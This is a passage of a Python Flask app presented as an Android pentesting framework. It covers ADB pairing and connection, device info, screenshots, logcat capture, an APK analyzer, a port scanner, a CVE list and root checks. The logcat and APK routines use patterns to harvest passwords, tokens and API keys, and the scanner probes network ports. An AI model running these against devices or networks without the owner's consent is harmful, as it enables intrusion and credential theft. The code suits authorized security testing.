#!/usr/bin/env python3
# DANIYAL KHAN - Professional Android Pentesting Framework
# Author: DANIYAL KHAN | @hexsecteam | v10.1.0 PRO
# QR Pairing Integration

import os, sys, re, io, json, time, base64, hashlib, zipfile, shutil, socket, platform
import threading, subprocess, webbrowser, concurrent.futures
from datetime import datetime
from pathlib import Path

def _ensure(pkg, name):
    try:
        __import__(pkg); return True
    except ImportError:
        print(f"[*] Installing {name}...")
        for extra in (["--break-system-packages"], []):
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", name, "--quiet"] + extra)
                return True
            except Exception:
                continue
        return False

_ensure("flask", "Flask")

from flask import Flask, request, jsonify, Response

VERSION = "10.1.0"
AUTHOR = "DANIYAL KHAN"
INSTAGRAM = "@hexsecteam"
HOST = "127.0.0.1"
PORT = 5000
SYSTEM = platform.system()
BASE = os.path.dirname(os.path.abspath(__file__))
OUT = os.path.join(BASE, "output")
for d in ("reports", "screenshots", "payloads", "logs"):
    os.makedirs(os.path.join(OUT, d), exist_ok=True)

# ═══════════════════════════════════════════════════════════════════════════════
#  CORE HELPERS
# ═══════════════════════════════════════════════════════════════════════════════

def tool_exists(n):
    return shutil.which(n) is not None

def adb(args, dev=None, timeout=30):
    c = ["adb"] + (["-s", dev] if dev else []) + args
    try:
        r = subprocess.run(c, capture_output=True, text=True, timeout=timeout)
        return (r.stdout or "").strip(), r.returncode
    except Exception as e:
        return str(e), -1

def check_adb():
    if not tool_exists("adb"):
        return False, "ADB not installed"
    out, rc = adb(["version"])
    return (rc == 0 and bool(out)), (out.splitlines()[0] if out else "adb")

def list_devices():
    out, _ = adb(["devices", "-l"])
    if not out:
        return []
    r = []
    for line in out.strip().splitlines()[1:]:
        p = line.split()
        if len(p) < 2:
            continue
        r.append({
            "serial": p[0],
            "state": p[1],
            "model": next((x.split(":", 1)[1] for x in p if x.startswith("model:")), "Unknown")
        })
    return r

def device_info(d):
    keys = {
        "Brand": "ro.product.brand", "Model": "ro.product.model",
        "Manufacturer": "ro.product.manufacturer",
        "Android": "ro.build.version.release", "SDK": "ro.build.version.sdk",
        "Build": "ro.build.id", "Security Patch": "ro.build.version.security_patch",
        "Fingerprint": "ro.build.fingerprint", "ABI": "ro.product.cpu.abi",
        "Hardware": "ro.hardware", "Serial": "ro.serialno", "Debuggable": "ro.debuggable"
    }
    return {k: (adb(["shell", f"getprop {v}"], d)[0] or "N/A") for k, v in keys.items()}

def device_ip(d):
    out, _ = adb(["shell", "ip addr show wlan0"], d)
    m = re.search(r"inet (\d+\.\d+\.\d+\.\d+)/", out or "")
    if m:
        return m.group(1)
    out, _ = adb(["shell", "ip route"], d)
    m = re.search(r"src (\d+\.\d+\.\d+\.\d+)", out or "")
    return m.group(1) if m else None

def packages(d, f="all"):
    flags = {"all": [], "system": ["-s"], "third_party": ["-3"], "disabled": ["-d"], "enabled": ["-e"]}
    out, _ = adb(["shell", "pm", "list", "packages"] + flags.get(f, []), d, 60)
    return [l.replace("package:", "").strip() for l in (out or "").splitlines() if l.startswith("package:")]

def logcat(d, n=300):
    out, _ = adb(["shell", f"logcat -d -t {n}"], d, 60)
    fn = os.path.join(OUT, "logs", f"logcat_{int(time.time())}.txt")
    if out:
        open(fn, "w", encoding="utf-8").write(out)
    pats = ["password", "token", "secret", "api_key", "auth", "bearer"]
    hits = [l for l in (out or "").splitlines() if any(p in l.lower() for p in pats)]
    return out, fn, hits

def screenshot(d):
    rem = "/sdcard/dh_screen.png"
    loc = os.path.join(OUT, "screenshots", f"shot_{int(time.time())}.png")
    adb(["shell", "screencap", "-p", rem], d)
    _, rc = adb(["pull", rem, loc], d, 120)
    adb(["shell", "rm", rem], d)
    return loc if rc == 0 else None

def do_pair(ip, port, code):
    try:
        p = subprocess.Popen(
            ["adb", "pair", f"{ip}:{port}"],
            stdin=subprocess.PIPE, stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT, text=True
        )
        out, _ = p.communicate(input=code + "\n", timeout=30)
        ok = "Successfully paired" in out or "already paired" in out.lower()
        return {"success": ok, "output": out.strip()}
    except subprocess.TimeoutExpired:
        try: p.kill()
        except Exception: pass
        return {"success": False, "output": "Timeout - check VPN/firewall"}
    except Exception as e:
        return {"success": False, "output": str(e)}

def do_connect(ip, port):
    out, _ = adb(["connect", f"{ip}:{port}"])
    ok = "connected" in (out or "").lower() and "cannot" not in (out or "").lower()
    return {"success": ok, "output": out}

def usb_to_wifi(port=5555):
    devs = list_devices()
    if not devs:
        return {"success": False, "output": "No USB device. Plug in USB and accept prompt."}
    d = devs[0]["serial"]
    out1, rc1 = adb(["tcpip", str(port)], d)
    if rc1 != 0:
        return {"success": False, "output": f"tcpip failed: {out1}"}
    time.sleep(2)
    ip = device_ip(d)
    if not ip:
        return {"success": False, "output": "Could not read device WiFi IP. Is WiFi enabled?"}
    out2, _ = adb(["connect", f"{ip}:{port}"])
    ok = "connected" in (out2 or "").lower()
    return {"success": ok, "output": f"tcpip: {out1}\nconnect: {out2}", "ip": ip, "port": port}

# ═══════════════════════════════════════════════════════════════════════════════
#  QR PAIRING (from first tool)
# ═══════════════════════════════════════════════════════════════════════════════

def find_qr_tool():
    found = shutil.which("adb-wifi-qr")
    if found: return found
    py = Path(sys.executable).parent
    cands = [
        py / "Scripts" / "adb-wifi-qr.exe",
        py / "Scripts" / "adb-wifi-qr",
        py / "adb-wifi-qr",
        Path(sys.executable).parent.parent / "bin" / "adb-wifi-qr",
    ]
    if os.name == "nt":
        for base in (os.environ.get("LOCALAPPDATA", ""),
                     os.environ.get("APPDATA", "")):
            if base:
                for v in ("Python314", "Python313", "Python312", "Python311"):
                    cands.append(Path(base) / "Python" / v / "Scripts" / "adb-wifi-qr.exe")
    # Also check the venv path pattern from this project
    try:
        venv_bin = Path(BASE) / ".venv" / "bin" / "adb-wifi-qr"
        cands.append(venv_bin)
        venv_scripts = Path(BASE) / ".venv" / "Scripts" / "adb-wifi-qr.exe"
        cands.append(venv_scripts)
    except Exception:
        pass
    for c in cands:
        try:
            if c.exists(): return str(c)
        except Exception:
            continue
    return None

def fix_mdns():
    """Repair adb mdns service. Uses adb() from THIS tool which returns (stdout, rc)."""
    os.environ["ADB_MDNS_OPENSCREEN"] = "1"
    adb(["kill-server"])
    adb(["kill-server"])
    time.sleep(0.8)
    adb(["start-server"])
    time.sleep(0.8)
    out, rc = adb(["mdns", "check"])
    c = (out or "").lower()
    ok = rc == 0 and "unknown host service" not in c and "error" not in c
    return ok, (out or "ready")

def open_qr_terminal():
    """Open a new terminal window running adb-wifi-qr --connect"""
    qr_tool = find_qr_tool()
    if not qr_tool:
        return False, "adb-wifi-qr not found. Install: pip install adb-wifi-qr"

    if os.name == "nt":
        # Windows: new cmd window
        cmd = f'start "DANIYAL KHAN - QR PAIRING" cmd /k ""{qr_tool}" --connect --timeout 180"'
        try:
            subprocess.Popen(cmd, shell=True)
            return True, "QR terminal opened"
        except Exception as e:
            return False, str(e)
    elif SYSTEM == "Darwin":
        # macOS: new Terminal window
        script = f'tell application "Terminal" to do script "{qr_tool} --connect --timeout 180"'
        try:
            subprocess.Popen(["osascript", "-e", script])
            return True, "QR terminal opened"
        except Exception as e:
            return False, str(e)
    else:
        # Linux: try common terminal emulators
        # Wrap in a bash shell so window stays open after exit
        shell_cmd = f'"{qr_tool}" --connect --timeout 180; echo; echo "Press Enter to close..."; read'
        terminals = [
            ["x-terminal-emulator", "-e", f"bash -c '{shell_cmd}'"],
            ["gnome-terminal", "--", "bash", "-c", shell_cmd],
            ["konsole", "-e", "bash", "-c", shell_cmd],
            ["xfce4-terminal", "-e", f"bash -c '{shell_cmd}'"],
            ["mate-terminal", "-e", f"bash -c '{shell_cmd}'"],
            ["lxterminal", "-e", f"bash -c '{shell_cmd}'"],
            ["tilix", "-e", "bash", "-c", shell_cmd],
            ["xterm", "-e", "bash", "-c", shell_cmd],
        ]
        for term in terminals:
            if shutil.which(term[0]):
                try:
                    subprocess.Popen(term)
                    return True, f"QR terminal opened ({term[0]})"
                except Exception:
                    continue
        return False, "No terminal emulator found. Install: sudo apt install xterm"

# ═══════════════════════════════════════════════════════════════════════════════
#  APK ANALYZER
# ═══════════════════════════════════════════════════════════════════════════════

DANGEROUS = {
    "android.permission.READ_SMS": "CRITICAL",
    "android.permission.SEND_SMS": "CRITICAL",
    "android.permission.READ_CONTACTS": "HIGH",
    "android.permission.RECORD_AUDIO": "CRITICAL",
    "android.permission.CAMERA": "MEDIUM",
    "android.permission.ACCESS_FINE_LOCATION": "HIGH",
    "android.permission.INSTALL_PACKAGES": "CRITICAL",
    "android.permission.BIND_DEVICE_ADMIN": "CRITICAL",
    "android.permission.SYSTEM_ALERT_WINDOW": "HIGH",
    "android.permission.WRITE_SECURE_SETTINGS": "CRITICAL",
    "android.permission.READ_PHONE_STATE": "HIGH",
    "android.permission.PROCESS_OUTGOING_CALLS": "HIGH",
}

SECRET_PATTERNS = [
    (r"(?i)(api[_-]?key)\s*[=:]\s*['\"]?([a-zA-Z0-9_\-]{16,})", "API Key"),
    (r"(?i)(secret|password|passwd)\s*[=:]\s*['\"]?(\S{6,})", "Password"),
    (r"-----BEGIN (RSA|EC|OPENSSH|DSA) PRIVATE KEY-----", "Private Key"),
    (r"(?i)(access[_-]?token)\s*[=:]\s*['\"]?([a-zA-Z0-9_\-\.]{16,})", "Access Token"),
    (r"(?i)(aws[_-]?access[_-]?key[_-]?id)\s*[=:]\s*['\"]?(AKIA[0-9A-Z]{16})", "AWS Key"),
]

def analyze_apk(path):
    f = {
        "path": path, "hashes": {}, "manifest": {}, "dangerous_permissions": [],
        "secrets": [], "urls": [], "debuggable": False, "backup": False, "vulns": []
    }
    if not os.path.isfile(path):
        return f
    try:
        data = open(path, "rb").read()
        for algo in ("md5", "sha1", "sha256"):
            h = hashlib.new(algo)
            h.update(data)
            f["hashes"][algo.upper()] = h.hexdigest()
    except Exception:
        pass
    try:
        z = zipfile.ZipFile(path, "r")
    except Exception:
        return f
    names = z.namelist()
    if "AndroidManifest.xml" in names:
        try:
            raw = z.read("AndroidManifest.xml")
            txt = raw.decode("utf-8", "ignore")
            f["debuggable"] = 'debuggable="true"' in txt or b'debuggable' in raw
            f["backup"] = 'allowBackup="true"' in txt or b'allowBackup' in raw
            perms = sorted(set(re.findall(r'android\.permission\.\w+', txt)))
            for p in perms:
                if p in DANGEROUS:
                    f["dangerous_permissions"].append({"permission": p, "severity": DANGEROUS[p]})
            pkg = re.search(r'package="([^"]+)"', txt)
            min_sdk = re.search(r'android:minSdkVersion="(\d+)"', txt)
            tgt_sdk = re.search(r'android:targetSdkVersion="(\d+)"', txt)
            f["manifest"] = {
                "package": pkg.group(1) if pkg else "Unknown",
                "min_sdk": min_sdk.group(1) if min_sdk else "Unknown",
                "target_sdk": tgt_sdk.group(1) if tgt_sdk else "Unknown",
            }
        except Exception:
            pass
    all_txt = ""
    for n in names:
        if n.endswith((".dex", ".xml", ".json", ".txt", ".js", ".properties")):
            try:
                all_txt += z.read(n).decode("utf-8", "ignore")
            except Exception:
                pass
    for pat, label in SECRET_PATTERNS:
        for m in re.finditer(pat, all_txt):
            f["secrets"].append({"type": label, "snippet": m.group(0)[:100]})
    f["urls"] = list(set(re.findall(r'https?://[^\s\'"<>]+', all_txt)))[:30]
    try:
        z.close()
    except Exception:
        pass
    if f["debuggable"]:
        f["vulns"].append({"name": "Debuggable APK", "severity": "HIGH",
                           "detail": "android:debuggable=true — allows debugger attachment"})
    if f["backup"]:
        f["vulns"].append({"name": "Backup Allowed", "severity": "MEDIUM",
                           "detail": "android:allowBackup=true — data extractable via adb backup"})
    if f["secrets"]:
        f["vulns"].append({"name": f"Hardcoded Secrets ({len(f['secrets'])})",
                           "severity": "CRITICAL", "detail": "Sensitive data found in APK"})
    return f

# ═══════════════════════════════════════════════════════════════════════════════
#  NETWORK & VULN
# ═══════════════════════════════════════════════════════════════════════════════

COMMON_PORTS = {
    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
    80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS", 445: "SMB",
    3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL", 5555: "ADB",
    5900: "VNC", 6379: "Redis", 8080: "HTTP-Alt", 8443: "HTTPS-Alt",
    27017: "MongoDB", 9200: "Elasticsearch",
}

def scan_port(h, p, t=0.8):
    try:
        with socket.create_connection((h, p), timeout=t):
            return p
    except Exception:
        return None

def port_scan(tgt, ports=None):
    if ports is None:
        ports = list(COMMON_PORTS.keys())
    op = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as ex:
        fs = {ex.submit(scan_port, tgt, p): p for p in ports}
        for f in concurrent.futures.as_completed(fs):
            r = f.result()
            if r:
                op.append(r)
    return sorted(op)

def check_cves(d):
    sdk, _ = adb(["shell", "getprop ro.build.version.sdk"], d)
    try:
        sdk_i = int(sdk or 0)
    except ValueError:
        sdk_i = 0
    cves = {
        "25": [("CVE-2017-0781", "CRITICAL", "BlueBorne Bluetooth RCE"),
               ("CVE-2017-13156", "HIGH", "Janus APK signature bypass")],
        "29": [("CVE-2020-0022", "CRITICAL", "BlueFrag Bluetooth RCE"),
               ("CVE-2020-0096", "HIGH", "StrandHogg 2.0 task hijacking")],
        "31": [("CVE-2022-20007", "HIGH", "ActivityManager task affinity hijacking")],
    }
    out = []
    for k, v in cves.items():
        if sdk_i <= int(k):
            for c in v:
                out.append({"cve": c[0], "severity": c[1], "detail": c[2]})
    return out

def check_root(d):
    r = {"rooted": False, "methods": []}
    for c, l in [("which su", "su binary present"),
                 ("ls /system/xbin/su", "su in /system/xbin"),
                 ("ls /system/bin/su", "su in /system/bin")]:
        o, _ = adb(["shell", c], d)
        if o and "not found" not in o.lower() and "no such" not in o.lower() and o.strip():
            r["rooted"] = True
            r["methods"].append(l)
    for pkg in ("magisk", "supersu"):
        o, _ = adb(["shell", f"pm list packages | grep {pkg}"], d)
        if o:
            r["rooted"] = True
            r["methods"].append(f"{pkg.title()} detected")
    return r

# ═══════════════════════════════════════════════════════════════════════════════
#  SESSION & REPORTS
# ═══════════════════════════════════════════════════════════════════════════════

_S = {"findings": [], "target": "Unknown", "permissions": [], "secrets": [], "urls": []}

def build_reports():
    jp = os.path.join(OUT, "reports", f"dk_{int(time.time())}.json")
    payload = {
        "tool": "DANIYAL KHAN PRO", "version": VERSION,
        "author": "DANIYAL KHAN | @hexsecteam",
        "generated": datetime.now().isoformat(),
        "target": _S["target"], "findings": _S["findings"]
    }
    with open(jp, "w", encoding="utf-8") as fp:
        json.dump(payload, fp, indent=2, default=str)

    hp = os.path.join(OUT, "reports", f"dk_{int(time.time())}.html")
    rows = "".join(
        f'<tr><td>{f.get("name","Unknown")}</td>'
        f'<td style="color:#ff6b6b;font-weight:600">{f.get("severity","?")}</td>'
        f'<td>{f.get("detail","")}</td></tr>'
        for f in _S["findings"]
    ) or '<tr><td colspan="3" style="text-align:center;color:#5a6b82">No findings</td></tr>'

    html = f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>DANIYAL KHAN PRO Report</title>
<style>
body{{font-family:'Segoe UI',sans-serif;background:#05080f;color:#e0e8f0;padding:30px}}
h1{{color:#00d4ff;text-align:center;text-shadow:0 0 20px rgba(0,212,255,.5)}}
table{{width:100%;border-collapse:collapse;background:#0a1018;border:1px solid #1a3a4a;margin-top:20px}}
th,td{{padding:12px;text-align:left;border-bottom:1px solid #1a3a4a}}
th{{background:#0f1724;color:#00d4ff}}
tr:hover{{background:#0f1724}}
.summary{{background:#0a1018;padding:20px;border-radius:8px;border:1px solid #1a3a4a}}
footer{{text-align:center;color:#5a6b82;margin-top:30px;font-family:monospace;font-size:12px}}
</style></head><body>
<h1>DANIYAL KHAN PRO — Security Report</h1>
<div class="summary">
<p><strong>Target:</strong> {_S["target"]}</p>
<p><strong>Generated:</strong> {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
<p><strong>Findings:</strong> {len(_S["findings"])}</p>
</div>
<table><tr><th>Finding</th><th>Severity</th><th>Details</th></tr>{rows}</table>
<footer>DANIYAL KHAN PRO v{VERSION} | @hexsecteam | Authorized use only</footer>
</body></html>"""
    with open(hp, "w", encoding="utf-8") as fp:
        fp.write(html)
    return hp

# ═══════════════════════════════════════════════════════════════════════════════
#  FLASK APP
# ═══════════════════════════════════════════════════════════════════════════════

app = Flask(__name__)

HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>DANIYAL KHAN PRO</title>
<style>
:root {
  --bg:#05080f; --panel:#0a1018; --hover:#0f1724; --border:#1a3a4a;
  --accent:#00d4ff; --accent2:#8b5cf6; --success:#51cf66;
  --danger:#ff6b6b; --warn:#f7b731;
  --text:#e0e8f0; --text2:#a0b0c8; --dim:#5a6b82;
  --console-bg:#020408; --console-fg:#00ff9f;
}
* { margin:0; padding:0; box-sizing:border-box; }
html, body { width:100%; height:100%; overflow:hidden; }
body {
  font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
  background: var(--bg); color: var(--text);
  background-image:
    radial-gradient(ellipse at 15% 20%, rgba(0,212,255,.08) 0%, transparent 40%),
    radial-gradient(ellipse at 85% 80%, rgba(139,92,246,.06) 0%, transparent 40%);
}
.app { display:flex; height:100vh; }

.sidebar {
  width:260px; background:var(--panel);
  border-right:1px solid var(--border);
  display:flex; flex-direction:column; flex-shrink:0;
}
.sidebar-header {
  padding:20px; border-bottom:1px solid var(--border);
  display:flex; align-items:center; gap:12px;
  background:linear-gradient(135deg, rgba(0,212,255,.05), rgba(139,92,246,.03));
}
.logo {
  width:44px; height:44px; border-radius:10px;
  background:linear-gradient(135deg, var(--accent), var(--accent2));
  display:flex; align-items:center; justify-content:center;
  font-weight:800; font-size:22px; color:var(--bg);
  box-shadow:0 0 20px rgba(0,212,255,.4);
}
.logo-text h2 { font-size:13px; font-weight:700; color:var(--accent); letter-spacing:2px; }
.logo-text p { font-size:10px; color:var(--dim); margin-top:2px; }

.nav { flex:1; overflow-y:auto; padding:8px 0; }
.nav-item {
  padding:11px 20px; color:var(--text2); font-size:13px;
  cursor:pointer; border-left:3px solid transparent;
  transition:all .15s; display:flex; align-items:center; gap:10px;
}
.nav-item:hover { background:rgba(0,212,255,.06); color:var(--accent); }
.nav-item.active {
  background:linear-gradient(90deg, rgba(0,212,255,.12), transparent);
  border-left-color:var(--accent); color:var(--accent); font-weight:600;
}

.sidebar-footer {
  padding:14px 20px; border-top:1px solid var(--border);
  font-size:11px; color:var(--dim);
}
.status { display:flex; align-items:center; gap:8px; margin-bottom:6px;
  font-weight:600; color:var(--success); font-size:11px; }
.dot { width:8px; height:8px; border-radius:50%; background:currentColor;
  animation:pulse 2s infinite; }
@keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.4} }

.main { flex:1; display:flex; flex-direction:column; overflow:hidden; }
.header {
  display:flex; justify-content:space-between; align-items:center;
  padding:16px 24px; background:var(--panel);
  border-bottom:1px solid var(--border); gap:16px; flex-wrap:wrap;
}
.header h1 { font-size:18px; font-weight:700; }
.header .sub { font-size:11px; color:var(--dim); margin-top:3px; }
.device-bar {
  display:flex; gap:8px; align-items:center;
  background:var(--hover); padding:8px 12px;
  border-radius:8px; border:1px solid var(--border);
}
.device-bar select {
  background:var(--bg); color:var(--accent);
  border:1px solid var(--border); border-radius:6px;
  padding:7px 10px; font-size:12px; min-width:200px; outline:none;
}
.device-bar select:focus { border-color:var(--accent); box-shadow:0 0 12px rgba(0,212,255,.2); }

.btn {
  padding:8px 14px; border:1px solid var(--border); border-radius:6px;
  background:var(--hover); color:var(--text); font-size:12px; font-weight:600;
  cursor:pointer; transition:all .2s; font-family:inherit;
  display:inline-flex; align-items:center; gap:6px; white-space:nowrap;
}
.btn:hover { border-color:var(--accent); color:var(--accent); background:rgba(0,212,255,.08); }
.btn.primary {
  background:linear-gradient(135deg, rgba(0,212,255,.2), rgba(139,92,246,.1));
  border-color:var(--accent); color:var(--accent);
  box-shadow:0 0 15px rgba(0,212,255,.2);
}
.btn.primary:hover { box-shadow:0 0 25px rgba(0,212,255,.4); }
.btn.qr {
  background:linear-gradient(135deg, rgba(139,92,246,.25), rgba(0,212,255,.15));
  border-color:var(--accent2); color:#c4b5fd;
  box-shadow:0 0 15px rgba(139,92,246,.3);
}
.btn.qr:hover { box-shadow:0 0 25px rgba(139,92,246,.5); color:#ddd6fe; }

.content { flex:1; overflow-y:auto; padding:20px 24px; }
.card {
  background:var(--panel); border:1px solid var(--border);
  border-radius:10px; padding:20px; margin-bottom:16px;
  box-shadow:0 0 20px rgba(0,212,255,.03);
}
.card h3 {
  font-size:12px; font-weight:700; color:var(--accent);
  text-transform:uppercase; letter-spacing:1.5px;
  margin-bottom:16px; display:flex; align-items:center; gap:8px;
}
.card p { color:var(--text2); font-size:13px; line-height:1.7; }

.fg { margin-bottom:12px; }
.fg label { display:block; font-size:11px; color:var(--dim);
  text-transform:uppercase; letter-spacing:.5px; margin-bottom:5px; }
.fg input {
  width:100%; padding:9px 12px; background:var(--bg);
  border:1px solid var(--border); border-radius:6px;
  color:var(--accent); font-size:13px; font-family:'Consolas', monospace;
  transition:all .2s; outline:none;
}
.fg input:focus { border-color:var(--accent); box-shadow:0 0 12px rgba(0,212,255,.2); }
.fg input::placeholder { color:var(--dim); }

.btn-group { display:flex; gap:8px; flex-wrap:wrap; margin-top:14px; }

.output {
  background:var(--console-bg); border:1px solid var(--border);
  border-radius:6px; padding:12px 14px;
  font-family:'Consolas', 'Courier New', monospace; font-size:12px;
  color:var(--console-fg); max-height:350px; overflow-y:auto;
  white-space:pre-wrap; word-break:break-word; margin-top:12px;
}

.stat-grid {
  display:grid; grid-template-columns:repeat(auto-fit, minmax(140px, 1fr));
  gap:12px; margin-bottom:16px;
}
.stat {
  background:linear-gradient(135deg, rgba(0,212,255,.06), rgba(139,92,246,.03));
  border:1px solid var(--border); border-radius:10px;
  padding:16px; text-align:center; transition:all .2s;
}
.stat:hover { border-color:var(--accent); box-shadow:0 0 20px rgba(0,212,255,.15); }
.stat-val {
  font-size:26px; font-weight:700;
  font-family:'Consolas', monospace; color:var(--accent);
  text-shadow:0 0 15px rgba(0,212,255,.5); margin-bottom:4px;
}
.stat-lbl { font-size:10px; color:var(--dim);
  text-transform:uppercase; letter-spacing:1.2px; }

.qr-status {
  padding:14px 16px; border-radius:8px; margin-top:12px;
  font-size:13px; display:flex; align-items:center; gap:10px;
  border:1px solid var(--border); background:var(--hover);
}
.qr-status.waiting { border-color:var(--warn); color:var(--warn); }
.qr-status.success { border-color:var(--success); color:var(--success); }
.qr-status.error { border-color:var(--danger); color:var(--danger); }
.qr-status .spinner {
  width:16px; height:16px; border:2px solid transparent;
  border-top-color:currentColor; border-radius:50%;
  animation:spin 1s linear infinite;
}
@keyframes spin { to { transform:rotate(360deg); } }

.console {
  background:var(--console-bg); border-top:1px solid var(--border);
  display:flex; flex-direction:column; height:190px; flex-shrink:0;
}
.console-hdr {
  display:flex; justify-content:space-between; align-items:center;
  padding:8px 18px; border-bottom:1px solid var(--border);
  font-family:'Consolas', monospace; font-size:11px;
  color:var(--accent); font-weight:700; letter-spacing:1px;
}
.console-body {
  flex:1; overflow-y:auto; padding:8px 18px;
  font-family:'Consolas', 'Courier New', monospace;
  font-size:12px; line-height:1.6; color:var(--console-fg);
}
.console-body .line { display:block; }
.console-body .error { color:var(--danger); }
.console-body .success { color:var(--success); }
.console-body .warn { color:var(--warn); }
.console-body .info { color:var(--accent); }

::-webkit-scrollbar { width:8px; height:8px; }
::-webkit-scrollbar-track { background:var(--panel); }
::-webkit-scrollbar-thumb {
  background:linear-gradient(180deg, var(--accent), var(--accent2));
  border-radius:4px;
}

@media (max-width:900px) {
  .sidebar { width:200px; }
  .device-bar select { min-width:130px; }
}
</style>
</head>
<body>
<div class="app">
  <aside class="sidebar">
    <div class="sidebar-header">
      <div class="logo">D</div>
      <div class="logo-text">
        <h2>DANIYAL KHAN</h2>
        <p>PRO v10.1.0</p>
      </div>
    </div>
    <nav class="nav" id="nav"></nav>
    <div class="sidebar-footer">
      <div class="status"><span class="dot"></span><span id="adbStat">Checking ADB...</span></div>
      <div>DANIYAL KHAN · @hexsecteam</div>
    </div>
  </aside>

  <main class="main">
    <header class="header">
      <div>
        <h1 id="pageTitle">Dashboard</h1>
        <p class="sub" id="pageSub">Professional Android Pentesting Suite</p>
      </div>
      <div class="device-bar">
        <select id="devSelect"><option>No devices</option></select>
        <button class="btn" onclick="refreshDevs()">Refresh</button>
        <button class="btn" onclick="selDev()">Select</button>
        <button class="btn primary" onclick="showView('connect')">Connect</button>
        <span id="devInd" style="font-size:11px;color:var(--dim)">No device</span>
      </div>
    </header>

    <div class="content" id="content"></div>

    <div class="console">
      <div class="console-hdr">
        <span>CONSOLE — DANIYAL KHAN PRO</span>
        <button class="btn" style="padding:4px 10px;font-size:10px" onclick="clearConsole()">Clear</button>
      </div>
      <div class="console-body" id="console"></div>
    </div>
  </main>
</div>

<script>
var curDev = null;
var curView = 'dashboard';
var devs = [];
var qrPollTimer = null;

var VIEWS = [
  ['dashboard',  'Dashboard'],
  ['connect',    'Connect Device'],
  ['device',     'Device Info'],
  ['apk',        'APK Analyzer'],
  ['network',    'Network Scanner'],
  ['vuln',       'Vulnerability Scan'],
  ['payload',    'Payload Generator'],
  ['report',     'Report Generator'],
  ['logcat',     'Logcat Analyzer'],
  ['screenshot', 'Screenshot'],
  ['packages',   'Package Manager'],
  ['files',      'File Transfer'],
  ['shell',      'ADB Shell'],
  ['remote',     'Remote Control'],
  ['about',      'About']
];

function log(msg, type) {
  type = type || 'info';
  var el = document.getElementById('console');
  if (!el) return;
  var div = document.createElement('div');
  div.className = 'line ' + type;
  var t = new Date().toLocaleTimeString('en-US', { hour12: false });
  div.textContent = '[' + t + '] ' + msg;
  el.appendChild(div);
  el.scrollTop = el.scrollHeight;
}

function clearConsole() {
  var el = document.getElementById('console');
  if (el) el.innerHTML = '';
}

async function api(url, opts) {
  opts = opts || {};
  var options = {
    method: opts.method || 'GET',
    headers: { 'Content-Type': 'application/json' }
  };
  if (opts.body) options.body = JSON.stringify(opts.body);
  var res = await fetch(url, options);
  var json = await res.json().catch(function() { return { error: 'Invalid response' }; });
  if (!res.ok) throw new Error(json.error || 'Request failed');
  return json;
}

function buildNav() {
  var nav = document.getElementById('nav');
  nav.innerHTML = '';
  for (var i = 0; i < VIEWS.length; i++) {
    (function(v) {
      var item = document.createElement('div');
      item.className = 'nav-item' + (v[0] === curView ? ' active' : '');
      item.textContent = v[1];
      item.onclick = function() { showView(v[0]); };
      nav.appendChild(item);
    })(VIEWS[i]);
  }
}

function showView(id) {
  try {
    curView = id;
    var items = document.querySelectorAll('.nav-item');
    for (var i = 0; i < items.length; i++) {
      if (VIEWS[i] && VIEWS[i][0] === id) items[i].classList.add('active');
      else items[i].classList.remove('active');
    }
    var view = null;
    for (var j = 0; j < VIEWS.length; j++) {
      if (VIEWS[j][0] === id) { view = VIEWS[j]; break; }
    }
    if (!view) return;
    document.getElementById('pageTitle').textContent = view[1];
    var c = document.getElementById('content');
    c.innerHTML = '';
    if (views[id]) views[id](c);
    else c.innerHTML = '<div class="card"><h3>' + view[1] + '</h3><p>Loading...</p></div>';
  } catch (e) {
    log('Error: ' + e.message, 'error');
  }
}

async function refreshDevs() {
  try {
    var data = await api('/api/devices');
    devs = data.devices || [];
    var sel = document.getElementById('devSelect');
    sel.innerHTML = '';
    if (!devs.length) {
      var o = document.createElement('option');
      o.textContent = 'No devices';
      sel.appendChild(o);
      return;
    }
    for (var i = 0; i < devs.length; i++) {
      var d = devs[i];
      var opt = document.createElement('option');
      opt.value = d.serial;
      opt.textContent = d.serial + ' | ' + d.model;
      opt.dataset.model = d.model;
      sel.appendChild(opt);
    }
    log('Found ' + devs.length + ' device(s)', 'success');
  } catch (e) {
    log('Device refresh failed: ' + e.message, 'error');
  }
}

function selDev() {
  var sel = document.getElementById('devSelect');
  if (!sel.value) { alert('Select a device first'); return; }
  curDev = sel.value;
  var opt = sel.options[sel.selectedIndex];
  document.getElementById('devInd').textContent = 'Selected: ' + (opt.dataset.model || curDev);
  log('Device selected: ' + curDev, 'success');
}

var views = {};

views.dashboard = function(c) {
  var html = '<div class="card">' +
    '<h3>Dashboard</h3>' +
    '<p>Professional Android Pentesting Framework v10.1.0<br>' +
    '<strong style="color:var(--accent)">Go to Connect Device to begin your assessment.</strong></p>' +
    '</div>';
  html += '<div class="stat-grid">' +
    '<div class="stat"><div class="stat-val">15</div><div class="stat-lbl">Modules</div></div>' +
    '<div class="stat"><div class="stat-val">10.1</div><div class="stat-lbl">Version</div></div>' +
    '<div class="stat"><div class="stat-val" id="findCount">0</div><div class="stat-lbl">Findings</div></div>' +
    '<div class="stat"><div class="stat-val" id="devCount">0</div><div class="stat-lbl">Devices</div></div>' +
    '</div>';
  c.innerHTML = html;
  refreshStats();
};

async function refreshStats() {
  try {
    var s = await api('/api/session');
    var fc = document.getElementById('findCount');
    var dc = document.getElementById('devCount');
    if (fc) fc.textContent = (s.findings || []).length;
    if (dc) dc.textContent = devs.length;
  } catch (e) { }
}

views.connect = function(c) {
  var html = '<div class="card" style="border-color:var(--accent2);box-shadow:0 0 25px rgba(139,92,246,.15)">' +
    '<h3 style="color:var(--accent2)">⚡ Method 1 — QR Code Pairing (Recommended)</h3>' +
    '<p>Click below. A new terminal window will open showing a QR code.<br>' +
    'On your phone: <strong>Settings → Developer Options → Wireless Debugging → Pair device with QR code</strong><br>' +
    'Scan the QR code with your phone — it will pair and connect automatically.</p>' +
